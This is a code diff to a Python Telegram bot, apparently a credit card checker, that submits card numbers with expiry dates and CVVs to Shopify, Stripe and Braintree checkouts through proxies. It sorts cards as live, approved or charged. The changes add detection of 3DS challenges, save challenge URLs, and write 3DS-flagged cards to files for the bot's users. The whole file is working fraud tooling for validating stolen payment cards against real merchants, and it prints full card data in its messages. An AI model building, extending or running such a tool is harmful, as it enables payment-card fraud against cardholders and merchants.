@@ -83,7 +83,7 @@ MAX_CARD_RETRIES = 3               # Max retries for retryable cards before mark
 CAPTCHA_BLOCK_MINUTES = 10         # CAPTCHA sites blocked temporarily (not permanently)
 SITE_TEST_RETRIES = 2              # Retries for 503/timeout during site testing
 SITE_TEST_RETRY_DELAY = 5          # Seconds between site test retries
-SITE_TEST_CONCURRENCY_LIMIT = 2    # Semaphore limit for concurrent site testing
+SITE_TEST_CONCURRENCY_LIMIT = 5    # Increased from 2: safe for 8GB VPS, faster batch testing
 PROXY_LATENCY_REFRESH_HOURS = 1    # Re-measure proxy latency every N hours
 
 # Browser user agents for general HTTP requests
@@ -159,6 +159,8 @@ class ShopifyCheckResult:
     error_msg: str = ""
     retryable: bool = False
     site_dead: bool = False
+    # 3DS challenge URL returned by the Flask API when ActionRequiredReceipt is detected
+    challenge_url: str = ""
 
 @dataclass
 class ShopifyAddress:
@@ -874,7 +876,7 @@ class CardCheckerBot:
                         "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "FRAUDULENT",
                         "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
                         "TRANSACTION_NOT_ALLOWED", "PAYMENTS_",
-                        "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
+                        "ORDER_PLACED", "APPROVED", "OTP_REQUIRED", "3DS_REQUIRED",
                     ]
                     if any(m in api_response for m in working_markers):
                         logger.info(f"Site {url} → ✅ WORKING ({api_response})")
@@ -1349,6 +1351,8 @@ class CardCheckerBot:
                 api_gateway = data.get("Gateway", "UNKNOWN")
                 api_price = data.get("Price", 0.0)
                 api_cc = data.get("cc", card_line)
+                # 3DS challenge URL (only present when Response == "3DS_REQUIRED")
+                api_challenge_url = data.get("challenge_url", "")
 
                 logger.info(f"[API] {site_name} | {api_response} | gate={api_gateway} | ${api_price} | {elapsed:.2f}s")
 
@@ -1386,6 +1390,8 @@ class CardCheckerBot:
                 elif api_status and any(kw in response_upper for kw in [
                     "INSUFFICIENT_FUNDS", "OTP_REQUIRED", "3DS_AUTHENTICATION",
                     "3D_SECURE", "AUTHENTICATION_REQUIRED", "ACTION_REQUIRED",
+                    # 3DS_REQUIRED: card is live but requires 3DS challenge — treat as approved
+                    "3DS_REQUIRED",
                     "APPROVED",
                 ]):
                     status = ShopifyCheckStatus.APPROVED
@@ -1409,6 +1415,7 @@ class CardCheckerBot:
                     error_msg=api_response if status == ShopifyCheckStatus.ERROR else "",
                     retryable=retryable,
                     site_dead=site_dead,
+                    challenge_url=api_challenge_url,
                 )
                 result.product_price = float(api_price) if api_price else 0.0
                 return result
@@ -1509,6 +1516,9 @@ class CardCheckerBot:
             }
             if current_proxy:
                 info["proxy"] = current_proxy
+            # Forward 3DS challenge URL so callers can display it to the user
+            if result.challenge_url:
+                info["challenge_url"] = result.challenge_url
 
             # Dead-site: mark dead and skip immediately (do NOT count as attempt)
             if result.site_dead:
@@ -1591,6 +1601,8 @@ class CardCheckerBot:
         }
         if proxy_str:
             info["proxy"] = proxy_str
+        if result.challenge_url:
+            info["challenge_url"] = result.challenge_url
         if result.status == ShopifyCheckStatus.CHARGED:
             info["approved"] = True
             info["reason"] = f"CHARGED ${result.amount} {result.currency}"
@@ -1706,7 +1718,7 @@ class CardCheckerBot:
                         "TRANSACTION_NOT_ALLOWED",
                         "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
                         "3DS_AUTHENTICATION", "3D_SECURE", "AUTHENTICATION_REQUIRED",
-                        "ACTION_REQUIRED",
+                        "ACTION_REQUIRED", "3DS_REQUIRED",
                         # Transient errors that prove store is working (not dead):
                         "TAX_NEW_TAX_MUST_BE_ACCEPTED",
                         "DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN",
@@ -2162,10 +2174,44 @@ class CardCheckerBot:
         gateway = info.get("gate", "SHOPIFY-RELOADED") or "SHOPIFY-RELOADED"
         proxy_line = f"│  🔗 Proxy:    <code>{used_proxy[:40]}…</code>" if used_proxy else "│  🌐 Mode:     <code>Direct Reloaded V2</code>"
         currency = info.get("currency", "USD")
+        reason = info.get("reason", "APPROVED" if approved else "Unknown error")
+        challenge_url = info.get("challenge_url", "")
+
+        # 3DS_REQUIRED: card is live but needs challenge — show dedicated 3DS message
+        if approved and "3DS_REQUIRED" in reason.upper():
+            return await self._format_shopify_3ds(card_line, bin_block, site_used, gateway, proxy_line, challenge_url)
+
+        # INSUFFICIENT_FUNDS: card is live but has insufficient funds
+        if approved and "INSUFFICIENT_FUNDS" in reason.upper():
+            amount = info.get("amount", "0.00")
+            return (
+                "╔══════════════════════════════════════╗\n"
+                f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ (Funds)  ║\n"
+                "╠══════════════════════════════════════╣\n"
+                f"║  {E('💎')} Shopify Reloaded entity V2 ENGINE       ║\n"
+                "╚══════════════════════════════════════╝\n\n"
+                f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
+                "│\n"
+                f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+                f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
+                f"{bin_block}"
+                "│\n"
+                f"├──────── {E('🌐')} 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
+                "│\n"
+                f"│  🏪 Site:      <code>{site_used}</code>\n"
+                f"│  🏧 Gateway:   <code>{gateway}</code>\n"
+                f"{proxy_line}\n"
+                f"│  💸 Reason:    <code>INSUFFICIENT_FUNDS — card is live</code>\n"
+                f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
+                "│\n"
+                "└──────────────────────────────────────┘\n\n"
+                f"{E('✅')} Status: APPROVED (Insufficient Funds – card is live)\n"
+                f"━━━ 💀 ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
+                "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
+            )
 
         if approved:
             amount = info.get("amount", "0.00")
-            reason = info.get("reason", "APPROVED")
             status_label = "CHARGED" if "CHARGED" in reason.upper() or "ORDER" in reason.upper() else "APPROVED"
             status_icon = "💰" if status_label == "CHARGED" else "✅"
             return (
@@ -2195,7 +2241,6 @@ class CardCheckerBot:
                 "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
             )
         else:
-            reason = info.get("reason", "Unknown error")
             amount = info.get("amount", "0.00")
             return (
                 "╔══════════════════════════════════════╗\n"
@@ -2222,6 +2267,45 @@ class CardCheckerBot:
                 f"━━━ 💀 ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
                 "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
             )
+
+    async def _format_shopify_3ds(self, card_line: str, bin_block: str, site_used: str,
+                                   gateway: str, proxy_line: str, challenge_url: str) -> str:
+        """Format a 3DS_REQUIRED result with the challenge URL for the user."""
+        parts = card_line.split('|')
+        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        if challenge_url:
+            url_line = f"│  🔗 3DS URL:  <code>{challenge_url[:120]}</code>\n"
+            action_line = "│  ℹ️  Open the URL above in a browser to complete verification.\n"
+        else:
+            url_line = "│  ℹ️  3DS URL not available in this response.\n"
+            action_line = ""
+        return (
+            "╔══════════════════════════════════════╗\n"
+            f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  3DS REQUIRED 🔐       ║\n"
+            "╠══════════════════════════════════════╣\n"
+            f"║  {E('💎')} Shopify Reloaded entity V2 ENGINE       ║\n"
+            "╚══════════════════════════════════════╝\n\n"
+            f"┌──────── {E('💳')} 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
+            "│\n"
+            f"│  {E('💳')} <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
+            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
+            f"{bin_block}"
+            "│\n"
+            f"├──────── {E('🌐')} 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
+            "│\n"
+            f"│  🏪 Site:      <code>{site_used}</code>\n"
+            f"│  🏧 Gateway:   <code>{gateway}</code>\n"
+            f"{proxy_line}\n"
+            f"│  🔐 Status:    <code>3DS / Additional Verification Required</code>\n"
+            f"{url_line}"
+            f"{action_line}"
+            f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
+            "│\n"
+            "└──────────────────────────────────────┘\n\n"
+            f"🟡 Status: APPROVED (3DS Required) — card is live 🔐\n"
+            f"━━━ 💀 ━━━ ✦ ━━━ {E('🔥')} ━━━\n"
+            "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
+        )
 
     async def format_owner_hit(self, card_line: str, gateway: str, raw: str = "", info: dict = None) -> str:
         parts = card_line.split('|')
@@ -3955,6 +4039,7 @@ class CardCheckerBot:
 
                 approved_cards = []
                 charged_cards = []
+                tds_cards = []    # 3DS-required cards (live but need challenge)
                 declined_count = 0
                 start_time = datetime.now()
 
@@ -4062,8 +4147,17 @@ class CardCheckerBot:
                                 )
                             if ok:
                                 self.throttle.record_success()
-                                fmt = await self.format_shopify_result(card, True, info, proxy)
-                                await self.safe_send_message(chat_id, fmt)
+                                reason_upper = info.get("reason", "").upper()
+                                challenge_url = info.get("challenge_url", "")
+                                if "3DS_REQUIRED" in reason_upper:
+                                    # 3DS: card is live — count as approved, log separately
+                                    fmt = await self.format_shopify_result(card, True, info, proxy)
+                                    await self.safe_send_message(chat_id, fmt)
+                                    tds_cards.append(card)
+                                else:
+                                    fmt = await self.format_shopify_result(card, True, info, proxy)
+                                    await self.safe_send_message(chat_id, fmt)
+                                # All approved outcomes (including 3DS) count toward stats
                                 self.stats["total_approved"] += 1
                                 approved_cards.append(card)
                                 self.update_user_stats(user_id, approved=1)
@@ -4152,7 +4246,7 @@ class CardCheckerBot:
                         cap = "✅ Stripe Approved"
                     elif gateway == 'braintree':
                         user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{ts}.txt")
-                        cap = "�� Braintree Approved"
+                        cap = "🔥 Braintree Approved"
                     else:
                         user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
                         cap = "✅ Shopify Approved"
@@ -4175,6 +4269,8 @@ class CardCheckerBot:
                     )
                     if charged_cards:
                         summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
+                    if tds_cards:
+                        summary += f"┃ 🔐 3DS Req:  <code>{len(tds_cards):,}</code>\n"
                     if gateway == 'shopify':
                         summary += f"┃ ❌ Declined: <code>{declined_count:,}</code>\n"
                     summary += (
@@ -4215,6 +4311,17 @@ class CardCheckerBot:
                             parse_mode='html'
                         )
                         os.remove(cf)
+
+                    # Save 3DS cards to a separate file so the user can complete challenges manually
+                    if tds_cards and gateway == 'shopify':
+                        tds_file = os.path.join(PROCESSED_DIR, f"3ds_{user_id}_{ts}.txt")
+                        with open(tds_file, "w") as f:
+                            f.write("\n".join(tds_cards))
+                        await self.bot_client.send_file(
+                            chat_id, tds_file,
+                            caption=f"🔐 3DS Required ({len(tds_cards)} cards) — open challenge URLs in a browser to verify"
+                        )
+                        os.remove(tds_file)
                 else:
                     summary = (
                         "╔══════════════════════════════╗\n"
